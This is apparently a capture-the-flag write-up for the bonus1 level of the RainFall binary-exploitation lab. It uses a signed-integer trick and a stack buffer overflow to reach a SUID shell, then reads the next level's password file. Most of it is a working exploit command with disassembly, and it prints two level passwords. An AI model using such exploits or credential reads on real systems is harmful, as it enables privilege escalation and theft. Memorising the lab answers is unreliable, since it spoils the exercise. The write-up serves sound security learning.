Login as `bonus1`.
```shell
┌──$ [~/42/2022/rainfall]
└─>  ssh 192.168.0.19 -p 4242 -l bonus1
bonus1@192.168.0.19's password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
```
A `SUID` executable is located in the home directory.
```shell
bonus1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
```
Program segfault at run.
```shell
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
```
By examining the binary in GDB, it has conditional call to `execl("/bin/sh", "sh", 0)`.
```gdb
(gdb) disass main
Dump of assembler code for function main:
   [...]
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   [...]
End of assembler dump.
```
In order to get there, the memory address `0xbffff32c` must be equal to `0x574f4c46` (WOLF).
Above this check, there is call to `atoi()` and check of result less or equal to 9.  Otherwise it return 1 and terminate.
```gdb
(gdb) disass main
Dump of assembler code for function main:
   [...]
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   [...]
End of assembler dump.
```

At start of `main()` 64 bytes are reserved on stack to hold variables.
```gdb
(gdb) x/i main+6
   0x804842a <main+6>:	sub    esp,0x40
gdb-peda$ x/32wx $esp
            # ESP
0xbffff6b0:	0xbffff8d2	0x08049764	0x00000003	0x080482fd
                        # DST[40]
0xbffff6c0:	0xb7fd13e4	0x00000014	0x08049764	0x080484d1
0xbffff6d0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
                                                # INTEGER
0xbffff6e0:	0xb7fed280	0x00000000	0x080484b9	0x80000030
0xbffff6f0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
0xbffff700:	0x00000003	0xbffff794	0xbffff7a4	0xb7fdc858
0xbffff710:	0x00000000	0xbffff71c	0xbffff7a4	0x00000000
0xbffff720:	0x0804821c	0xb7fd0ff4	0x00000000	0x00000000
```
Considering that `atoi()` returns an integer 4 bytes, 40 bytes are reserved for `dst` array.
```
ESP     = 0xbffff6b0
integer = 0xbffff6ec $esp+0x3c
dst[40] = 0xbffff6c4 $esp+0x14
```
In order to overwrite integer value, `av[2]` must have 40 bytes followed by value `0x574f4c46`.

Exploit and log on to the next level.
```shell
bonus1@RainFall:~$ /home/user/bonus1/bonus1 -2147483600 $(python -c "import struct; print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A' + struct.pack('I', 0x574f4c46))")
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
